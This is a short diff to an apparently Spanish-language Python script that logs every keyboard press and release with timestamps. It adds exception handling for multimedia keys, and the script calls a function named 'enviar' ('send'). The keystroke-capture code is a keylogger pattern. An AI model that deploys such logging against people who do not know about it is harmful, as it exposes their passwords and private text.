@@ -22,12 +22,16 @@ def on_press(key):
         escribir("Keyboard", "Pressed", time(), key.char)
     except AttributeError:
         escribir("Keyboard", "Pressed", time(), str(key))
+    except TypeError:
+        pass
 
 def on_release(key):
     try:
         escribir("Keyboard", "Release", time(), key.char)
     except AttributeError:
         escribir("Keyboard", "Release", time(), str(key))
+    except TypeError:
+        pass
 
 if enviar():
     try:
@@ -60,5 +64,4 @@ hilo_ppal = threading.main_thread() # Obtiene hilo principal
 for hilo in threading.enumerate(): # Recorre hilos activos para controlar estado de su ejecución
     if hilo is hilo_ppal:    # Si el hilo es hilo_ppal continua al siguiente hilo activo
         continue
-    hilo.join()         # El programa esperará a que este hilo finalice:
-#TODO: las teclas multimedia no estan soportadas, agregar excepcion para continuar
+    hilo.join()         # El programa esperará a que este hilo finalice
